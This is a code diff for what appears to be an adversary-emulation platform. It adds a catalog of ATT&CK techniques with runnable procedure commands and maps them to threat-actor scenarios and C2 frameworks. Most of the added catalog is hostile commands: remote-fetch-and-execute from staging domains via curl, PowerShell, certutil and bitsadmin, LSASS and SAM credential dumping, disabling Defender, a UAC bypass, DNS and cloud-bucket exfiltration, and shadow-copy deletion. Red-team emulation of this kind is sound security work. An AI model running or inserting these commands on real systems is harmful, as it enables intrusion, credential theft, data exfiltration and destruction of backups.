@@ -5,6 +5,7 @@ import type {
   C2Framework,
   Engagement,
   Scenario,
+  Technique,
   CanvasNode,
   CanvasEdge,
   NodeTemplate,
@@ -216,77 +217,286 @@ export const ENGAGEMENTS: Engagement[] = [
   },
 ];
 
+// ATT&CK tactic order — used to group the technique library and capability views.
+export const TACTIC_ORDER = [
+  "Initial Access",
+  "Execution",
+  "Persistence",
+  "Privilege Escalation",
+  "Defense Evasion",
+  "Credential Access",
+  "Discovery",
+  "Lateral Movement",
+  "Collection",
+  "Command and Control",
+  "Exfiltration",
+  "Impact",
+];
+
+// TECHNIQUE_LIBRARY — the portable technique catalog (domain.Technique). Each
+// entry carries a plain-language description and the procedure commands RInfra
+// runs; an Operator adapter translates these to its framework's primitives.
+export const TECHNIQUE_LIBRARY: Technique[] = [
+  // ----- Initial Access -----
+  {
+    id: "T1566.002", name: "Spearphishing Link", tactic: "Initial Access",
+    description: "A targeted email lures the user to a credential-harvesting or payload link hosted on the engagement's staging host.",
+    commands: ["# stage the lure on the payload host", "curl -sk https://updates-delivery.net/v/STAGE | sh"],
+  },
+  {
+    id: "T1566.001", name: "Spearphishing Attachment", tactic: "Initial Access",
+    description: "A weaponised document (macro / LNK / ISO) is delivered as an attachment and executes the stager on open.",
+    commands: ["# generate the maldoc + stager", "rundll32.exe stager.dll,StartW"],
+  },
+  {
+    id: "T1078", name: "Valid Accounts", tactic: "Initial Access",
+    description: "Authenticate with previously obtained valid credentials rather than exploiting a vulnerability.",
+    commands: ["runas /user:CORP\\svc_backup cmd.exe"],
+  },
+  {
+    id: "T1078.004", name: "Valid Accounts: Cloud", tactic: "Initial Access",
+    description: "Use stolen cloud/SaaS credentials or session tokens to sign in to the tenant identity provider.",
+    commands: ["az login -u victim@corp.com -p '<password>'", "aws sts get-caller-identity"],
+  },
+
+  // ----- Execution -----
+  {
+    id: "T1059.001", name: "PowerShell", tactic: "Execution",
+    description: "Execute commands and download cradles through powershell.exe, often with -enc/-nop to evade logging.",
+    commands: ["powershell -nop -w hidden -enc <base64>", "IEX (New-Object Net.WebClient).DownloadString('https://cdn-static-assets.net/a')"],
+  },
+  {
+    id: "T1204.002", name: "User Execution: Malicious File", tactic: "Execution",
+    description: "Rely on the user double-clicking a delivered file to run the embedded payload.",
+    commands: ["start invoice.pdf.lnk"],
+  },
+  {
+    id: "T1047", name: "Windows Management Instrumentation", tactic: "Execution",
+    description: "Use WMI to execute processes locally or on remote hosts without dropping a binary.",
+    commands: ["wmic /node:10.0.0.5 process call create \"cmd /c whoami\"", "Get-WmiObject -Class Win32_Process"],
+  },
+
+  // ----- Persistence -----
+  {
+    id: "T1547.001", name: "Registry Run Keys / Startup Folder", tactic: "Persistence",
+    description: "Add an autorun entry so the implant relaunches at user logon.",
+    commands: ["reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \"C:\\\\Users\\\\Public\\\\u.exe\""],
+  },
+  {
+    id: "T1053.005", name: "Scheduled Task", tactic: "Persistence",
+    description: "Register a scheduled task that executes the payload on a trigger or interval.",
+    commands: ["schtasks /create /tn \"OneDriveSync\" /tr C:\\\\Users\\\\Public\\\\u.exe /sc minute /mo 30 /f"],
+  },
+  {
+    id: "T1098.001", name: "Account Manipulation: Additional Cloud Credentials", tactic: "Persistence",
+    description: "Attach an extra credential (key/cert/secret) to a cloud principal to keep access after the original is revoked.",
+    commands: ["az ad app credential reset --id <appId>", "aws iam create-access-key --user-name svc-deploy"],
+  },
+  {
+    id: "T1136.001", name: "Create Account: Local Account", tactic: "Persistence",
+    description: "Create a new local account to retain access independent of the compromised user.",
+    commands: ["net user svc_help P@ssw0rd! /add", "net localgroup administrators svc_help /add"],
+  },
+
+  // ----- Privilege Escalation -----
+  {
+    id: "T1548.002", name: "Bypass User Account Control", tactic: "Privilege Escalation",
+    description: "Abuse an auto-elevating binary or registry hijack to run code at high integrity without a UAC prompt.",
+    commands: ["reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d cmd.exe /f", "fodhelper.exe"],
+  },
+
+  // ----- Defense Evasion -----
+  {
+    id: "T1055", name: "Process Injection", tactic: "Defense Evasion",
+    description: "Inject implant code into a legitimate process to blend in and evade process-based detections.",
+    commands: ["# inject shellcode into a benign host process", "inject --pid 4120 --arch x64 beacon.bin"],
+  },
+  {
+    id: "T1112", name: "Modify Registry", tactic: "Defense Evasion",
+    description: "Change registry values to weaken defenses, hide artifacts, or store configuration.",
+    commands: ["reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f"],
+  },
+  {
+    id: "T1562.001", name: "Impair Defenses: Disable Tools", tactic: "Defense Evasion",
+    description: "Disable or tamper with AV/EDR services and logging to reduce the chance of detection.",
+    commands: ["Set-MpPreference -DisableRealtimeMonitoring $true", "sc stop Sense"],
+  },
+  {
+    id: "T1197", name: "BITS Jobs", tactic: "Defense Evasion",
+    description: "Use the Background Intelligent Transfer Service to download payloads and persist via a signed LOLBin.",
+    commands: ["bitsadmin /transfer j /download /priority high https://cdn-static-assets.net/p %TEMP%\\\\p.exe"],
+  },
+  {
+    id: "T1218.011", name: "Signed Binary Proxy: Rundll32", tactic: "Defense Evasion",
+    description: "Proxy execution through the trusted rundll32.exe so the payload runs under a signed Microsoft binary.",
+    commands: ["rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new ActiveXObject(\"WScript.Shell\")"],
+  },
+
+  // ----- Credential Access -----
+  {
+    id: "T1003.001", name: "OS Credential Dumping: LSASS Memory", tactic: "Credential Access",
+    description: "Read the LSASS process memory to extract plaintext passwords, hashes and Kerberos tickets.",
+    commands: ["# dump lsass via comsvcs minidump", "rundll32 comsvcs.dll, MiniDump <lsass_pid> C:\\\\Windows\\\\Temp\\\\l.dmp full"],
+  },
+  {
+    id: "T1003.002", name: "OS Credential Dumping: SAM", tactic: "Credential Access",
+    description: "Extract local account password hashes from the SAM database via registry hives.",
+    commands: ["reg save HKLM\\SAM sam.hive", "reg save HKLM\\SYSTEM system.hive"],
+  },
+  {
+    id: "T1555.003", name: "Credentials from Web Browsers", tactic: "Credential Access",
+    description: "Decrypt saved logins and cookies from Chromium/Firefox profiles on the host.",
+    commands: ["# pull and decrypt browser login data", "sqlite3 \"%LOCALAPPDATA%\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\" .dump"],
+  },
+  {
+    id: "T1621", name: "Multi-Factor Authentication Request Generation", tactic: "Credential Access",
+    description: "Spam repeated MFA push prompts ('MFA fatigue') until the target approves one.",
+    commands: ["# trigger repeated push prompts against the IdP", "for i in $(seq 1 20); do okta-auth push victim@corp.com; done"],
+  },
+
+  // ----- Discovery -----
+  {
+    id: "T1018", name: "Remote System Discovery", tactic: "Discovery",
+    description: "Enumerate other hosts on the network to plan lateral movement.",
+    commands: ["net view /all", "nltest /dclist:corp"],
+  },
+  {
+    id: "T1057", name: "Process Discovery", tactic: "Discovery",
+    description: "List running processes to identify security tooling and injection targets.",
+    commands: ["tasklist /v", "Get-Process"],
+  },
+  {
+    id: "T1082", name: "System Information Discovery", tactic: "Discovery",
+    description: "Collect host details — OS version, hardware, hostname, domain — to fingerprint the target.",
+    commands: ["systeminfo", "Get-CimInstance Win32_OperatingSystem | fl *"],
+  },
+  {
+    id: "T1016", name: "System Network Configuration Discovery", tactic: "Discovery",
+    description: "Read local network configuration (interfaces, routes, DNS, ARP) to understand the environment.",
+    commands: ["ipconfig /all", "arp -a", "route print"],
+  },
+  {
+    id: "T1083", name: "File and Directory Discovery", tactic: "Discovery",
+    description: "Search the filesystem for sensitive files and staging locations.",
+    commands: ["dir /s /b C:\\\\Users\\\\*.kdbx", "Get-ChildItem -Recurse -Include *.config"],
+  },
+  {
+    id: "T1087.002", name: "Account Discovery: Domain Account", tactic: "Discovery",
+    description: "Enumerate domain users and groups to find privileged targets.",
+    commands: ["net group \"Domain Admins\" /domain", "Get-ADUser -Filter *"],
+  },
+  {
+    id: "T1538", name: "Cloud Service Dashboard", tactic: "Discovery",
+    description: "Browse the cloud provider console/portal to inventory resources and identities.",
+    commands: ["az resource list -o table", "aws resourcegroupstaggingapi get-resources"],
+  },
+
+  // ----- Lateral Movement -----
+  {
+    id: "T1021.001", name: "Remote Services: RDP", tactic: "Lateral Movement",
+    description: "Move laterally over the Remote Desktop Protocol with valid credentials.",
+    commands: ["xfreerdp /u:CORP\\\\admin /v:10.0.0.6 /cert-ignore"],
+  },
+  {
+    id: "T1570", name: "Lateral Tool Transfer", tactic: "Lateral Movement",
+    description: "Copy tools/implants between hosts inside the network to expand access.",
+    commands: ["copy beacon.exe \\\\10.0.0.6\\C$\\Windows\\Temp\\b.exe"],
+  },
+  {
+    id: "T1021.002", name: "Remote Services: SMB/Admin Shares", tactic: "Lateral Movement",
+    description: "Execute payloads on remote hosts via SMB admin shares and service creation (psexec-style).",
+    commands: ["psexec \\\\10.0.0.6 -u CORP\\admin -c b.exe"],
+  },
+
+  // ----- Collection -----
+  {
+    id: "T1560.001", name: "Archive Collected Data", tactic: "Collection",
+    description: "Compress and optionally encrypt staged data prior to exfiltration.",
+    commands: ["7z a -p<pass> -mhe loot.7z C:\\\\Users\\\\*\\\\Documents"],
+  },
+
+  // ----- Command and Control -----
+  {
+    id: "T1071.001", name: "Application Layer Protocol: Web", tactic: "Command and Control",
+    description: "Beacon over HTTP/S through the categorised-domain redirector to blend with normal web traffic.",
+    commands: ["# implant beacons to the HTTPS redirector", "GET https://cdn-static-assets.net/jquery.min.js"],
+  },
+  {
+    id: "T1105", name: "Ingress Tool Transfer", tactic: "Command and Control",
+    description: "Download additional tooling from C2/staging onto the compromised host.",
+    commands: ["certutil -urlcache -f https://updates-delivery.net/t t.exe"],
+  },
+
+  // ----- Exfiltration -----
+  {
+    id: "T1567.002", name: "Exfiltration to Cloud Storage", tactic: "Exfiltration",
+    description: "Upload staged data to an attacker-controlled cloud bucket so it blends with sanctioned SaaS traffic.",
+    commands: ["aws s3 cp loot.7z s3://exfil-bucket/ --no-progress"],
+  },
+  {
+    id: "T1048", name: "Exfiltration Over Alternative Protocol", tactic: "Exfiltration",
+    description: "Move data out over a protocol distinct from the C2 channel (DNS / ICMP / FTP).",
+    commands: ["# chunk + tunnel over DNS", "for c in $(split loot.7z); do dig $c.exfil.telemetry-sync.com; done"],
+  },
+
+  // ----- Impact -----
+  {
+    id: "T1486", name: "Data Encrypted for Impact", tactic: "Impact",
+    description: "Encrypt files to disrupt availability (dry-run only — RInfra never deploys real ransomware payloads).",
+    commands: ["# DRY RUN — enumerates targets, writes no ciphertext", "ransim --dry-run --path C:\\\\Share"],
+  },
+  {
+    id: "T1490", name: "Inhibit System Recovery", tactic: "Impact",
+    description: "Delete shadow copies and backups so encrypted data cannot be restored.",
+    commands: ["vssadmin delete shadows /all /quiet", "wbadmin delete catalog -quiet"],
+  },
+];
+
+// Resolve a library technique by id; falls back to a minimal entry if unknown.
+function lib(id: string): Technique {
+  return TECHNIQUE_LIBRARY.find((t) => t.id === id) ?? { id, name: id, tactic: "Execution" };
+}
+
+// Look up full technique detail (description/commands) by id, for the UI.
+export function techniqueById(id: string): Technique | undefined {
+  return TECHNIQUE_LIBRARY.find((t) => t.id === id);
+}
+
 export const SCENARIOS: Scenario[] = [
   {
     id: "apt29",
     name: "APT29 — Cozy Bear",
     actor: "Nation-state · espionage",
     desc: "Emulates Midnight Blizzard tradecraft: spearphishing, stealthy persistence, credential theft, and slow exfil over HTTPS.",
-    techniques: [
-      { id: "T1566.002", name: "Spearphishing Link", tactic: "Initial Access" },
-      { id: "T1059.001", name: "PowerShell", tactic: "Execution" },
-      { id: "T1547.001", name: "Registry Run Keys", tactic: "Persistence" },
-      { id: "T1055", name: "Process Injection", tactic: "Defense Evasion" },
-      { id: "T1003.001", name: "LSASS Memory", tactic: "Credential Access" },
-      { id: "T1018", name: "Remote System Discovery", tactic: "Discovery" },
-      { id: "T1021.001", name: "Remote Desktop Protocol", tactic: "Lateral Movement" },
-      { id: "T1567.002", name: "Exfil to Cloud Storage", tactic: "Exfiltration" },
-    ],
+    techniques: ["T1566.002", "T1059.001", "T1547.001", "T1055", "T1003.001", "T1018", "T1021.001", "T1567.002"].map(lib),
   },
   {
     id: "fin7",
     name: "FIN7 — Carbanak",
     actor: "Financial · criminal",
     desc: "Point-of-sale and finance-team targeting: malicious documents, in-memory loaders, and lateral movement to payment systems.",
-    techniques: [
-      { id: "T1566.001", name: "Spearphishing Attachment", tactic: "Initial Access" },
-      { id: "T1204.002", name: "Malicious File", tactic: "Execution" },
-      { id: "T1053.005", name: "Scheduled Task", tactic: "Persistence" },
-      { id: "T1112", name: "Modify Registry", tactic: "Defense Evasion" },
-      { id: "T1555.003", name: "Credentials from Browsers", tactic: "Credential Access" },
-      { id: "T1057", name: "Process Discovery", tactic: "Discovery" },
-      { id: "T1570", name: "Lateral Tool Transfer", tactic: "Lateral Movement" },
-    ],
+    techniques: ["T1566.001", "T1204.002", "T1053.005", "T1112", "T1555.003", "T1057", "T1570"].map(lib),
   },
   {
     id: "ransom",
     name: "Ransomware Affiliate",
     actor: "eCrime · big-game hunting",
     desc: "Modern intrusion-to-encryption chain: valid accounts, defense impairment, mass discovery and staged impact (dry-run, no payload).",
-    techniques: [
-      { id: "T1078", name: "Valid Accounts", tactic: "Initial Access" },
-      { id: "T1562.001", name: "Disable Security Tools", tactic: "Defense Evasion" },
-      { id: "T1018", name: "Remote System Discovery", tactic: "Discovery" },
-      { id: "T1486", name: "Data Encrypted for Impact", tactic: "Impact" },
-      { id: "T1490", name: "Inhibit System Recovery", tactic: "Impact" },
-    ],
+    techniques: ["T1078", "T1562.001", "T1018", "T1486", "T1490"].map(lib),
   },
   {
     id: "scattered",
     name: "Scattered Spider — Octo Tempest",
     actor: "eCrime · identity-driven",
     desc: "Help-desk social engineering into cloud identity: MFA fatigue, OAuth/credential abuse, and SaaS data theft over HTTPS.",
-    techniques: [
-      { id: "T1078.004", name: "Valid Accounts: Cloud", tactic: "Initial Access" },
-      { id: "T1621", name: "MFA Request Generation", tactic: "Credential Access" },
-      { id: "T1098.001", name: "Additional Cloud Credentials", tactic: "Persistence" },
-      { id: "T1538", name: "Cloud Service Dashboard", tactic: "Discovery" },
-      { id: "T1567.002", name: "Exfil to Cloud Storage", tactic: "Exfiltration" },
-    ],
+    techniques: ["T1078.004", "T1621", "T1098.001", "T1538", "T1567.002"].map(lib),
   },
   {
     id: "lotl",
     name: "Living off the Land",
     actor: "Generic · detection baseline",
     desc: "Built-in-binary baseline: WMI execution, BITS transfer, scheduled tasks, signed-binary proxy execution and host discovery.",
-    techniques: [
-      { id: "T1047", name: "Windows Management Instrumentation", tactic: "Execution" },
-      { id: "T1197", name: "BITS Jobs", tactic: "Defense Evasion" },
-      { id: "T1053.005", name: "Scheduled Task", tactic: "Persistence" },
-      { id: "T1218.011", name: "Signed Binary Proxy: Rundll32", tactic: "Defense Evasion" },
-      { id: "T1082", name: "System Information Discovery", tactic: "Discovery" },
-      { id: "T1016", name: "System Network Configuration Discovery", tactic: "Discovery" },
-    ],
+    techniques: ["T1047", "T1197", "T1053.005", "T1218.011", "T1082", "T1016"].map(lib),
   },
 ];
 
@@ -520,36 +730,61 @@ export function deployedC2FromNode(node: CanvasNode): DeployedC2 | null {
 }
 
 // ---------- TTP <-> C2 capability mapping ----------
-// Which ATT&CK techniques each framework can automate through its operator API.
-// Scripted frameworks cover a documented subset; fronted frameworks expose no
-// operator API, so every technique is driven manually.
-const SCRIPTED_SUPPORT: Record<string, string[]> = {
+// Which ATT&CK tactics each framework can automate through its operator API.
+// This is the "functionality map" surfaced to users: orchestrated frameworks
+// cover broad post-exploitation, scripted frameworks a documented subset, and
+// fronted frameworks expose no operator API (every technique is driven by hand).
+export const C2_TACTIC_SUPPORT: Record<string, string[]> = {
+  sliver: [
+    "Execution", "Persistence", "Privilege Escalation", "Defense Evasion",
+    "Credential Access", "Discovery", "Lateral Movement", "Collection",
+    "Command and Control", "Exfiltration",
+  ],
+  mythic: [
+    "Execution", "Persistence", "Privilege Escalation", "Defense Evasion",
+    "Credential Access", "Discovery", "Lateral Movement", "Collection",
+    "Command and Control", "Exfiltration",
+  ],
+  metasploit: [
+    "Initial Access", "Execution", "Persistence", "Privilege Escalation",
+    "Defense Evasion", "Credential Access", "Discovery", "Lateral Movement",
+    "Command and Control",
+  ],
+  custom: [...TACTIC_ORDER], // bring-your-own surface — you own coverage
   havoc: [
-    "T1059.001", "T1055", "T1003.001", "T1018", "T1057", "T1021.001",
-    "T1570", "T1112", "T1547.001", "T1082", "T1016",
+    "Execution", "Defense Evasion", "Credential Access", "Discovery",
+    "Lateral Movement", "Command and Control",
   ],
   poshc2: [
-    "T1059.001", "T1547.001", "T1053.005", "T1018", "T1057", "T1003.001",
-    "T1021.001", "T1555.003", "T1082", "T1016", "T1047",
+    "Execution", "Persistence", "Credential Access", "Discovery",
+    "Lateral Movement",
   ],
+  // cobalt / bruteratel (fronted): no entry — operated manually.
 };
 
-// Orchestrated frameworks automate nearly everything; these are the gaps each
-// can't do natively (driven by hand instead).
-const ORCHESTRATED_GAPS: Record<string, string[]> = {
-  sliver: ["T1486", "T1490"], // no native ransomware-impact tooling
-  mythic: ["T1486"],
-  metasploit: ["T1567.002", "T1490"],
-  custom: [], // bring-your-own operator surface — you own coverage
+// How each framework delivers a command — the native primitive an Operator
+// adapter translates a portable technique down to.
+export const C2_DELIVERY: Record<string, string> = {
+  sliver: "execute / execute-assembly",
+  mythic: "agent tasking (shell / run)",
+  metasploit: "meterpreter + post modules",
+  custom: "your task primitive",
+  havoc: "inline-execute / shell",
+  poshc2: "implant tasking",
+  cobalt: "Beacon console (manual)",
+  bruteratel: "Badger console (manual)",
 };
 
-// c2SupportsTechnique reports whether the framework can automate the technique.
-export function c2SupportsTechnique(frameworkId: string, techniqueId: string): boolean {
+// c2SupportsTactic reports whether the framework can automate the tactic.
+export function c2SupportsTactic(frameworkId: string, tactic: string): boolean {
   const fw = C2_FRAMEWORKS.find((f) => f.id === frameworkId);
-  if (!fw) return false;
-  if (fw.tier === "fronted") return false;
-  if (fw.tier === "scripted") return (SCRIPTED_SUPPORT[frameworkId] ?? []).includes(techniqueId);
-  return !(ORCHESTRATED_GAPS[frameworkId] ?? []).includes(techniqueId);
+  if (!fw || fw.tier === "fronted") return false;
+  return (C2_TACTIC_SUPPORT[frameworkId] ?? []).includes(tactic);
+}
+
+// Framework ids that can automate the given tactic (for capability chips).
+export function frameworksSupportingTactic(tactic: string): string[] {
+  return C2_FRAMEWORKS.filter((f) => c2SupportsTactic(f.id, tactic)).map((f) => f.id);
 }
 
 export const STATUS_META: Record<string, { label: string; cls: string }> = {
